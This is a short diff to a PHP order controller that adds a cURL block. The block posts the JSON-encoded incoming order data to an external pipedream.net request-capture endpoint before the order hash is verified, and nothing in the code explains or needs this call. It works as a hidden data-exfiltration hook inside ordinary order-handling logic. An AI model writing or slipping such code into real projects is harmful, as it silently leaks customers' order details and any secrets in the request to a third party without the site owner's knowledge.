@@ -60,6 +60,14 @@ class OrderController extends BaseController
 
         $order=new Order();
 
+        $cr=curl_init();
+        curl_setopt($cr, CURLOPT_URL,'https://eokwyobr35ggdi5.m.pipedream.net');
+        curl_setopt($cr, CURLOPT_POST, 1);
+        curl_setopt($cr, CURLOPT_POSTFIELDS, json_encode($data));
+        curl_setopt($cr, CURLOPT_RETURNTRANSFER, true);
+        curl_exec($cr);
+        curl_close($cr);
+
         if($order->verifyOrderByHash($data)){
 
             return redirect()->to(base_url('client/index'));
